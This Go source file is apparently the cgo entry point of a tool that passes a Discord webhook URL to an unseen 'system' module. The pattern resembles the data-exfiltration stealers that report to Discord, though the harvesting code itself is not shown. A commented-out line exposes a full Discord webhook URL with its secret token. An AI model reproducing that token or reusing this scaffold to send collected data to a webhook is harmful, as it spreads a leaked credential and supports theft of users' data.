package main

import (
	"fmt"
	"os"
    "C"
    "main.go/modules/system"
)

func run(arg *C.char) {
//	webhook := "https://discord.com/api/webhooks/1302674995280871545/fsmwXtFfChCn7ktcF3Gy8Pu0mv8YeOv9Izht3yC7Kstm5gHsa8ovmSvepksTpKXc7ICe"

    webhook := C.GoString(arg)
	defer func() {
		if err := recover(); err != nil {
			fmt.Fprintf(os.Stderr, "Error occurred: %v\n", err)
		}
	}()

	system.Run(webhook)
}

func main() {}
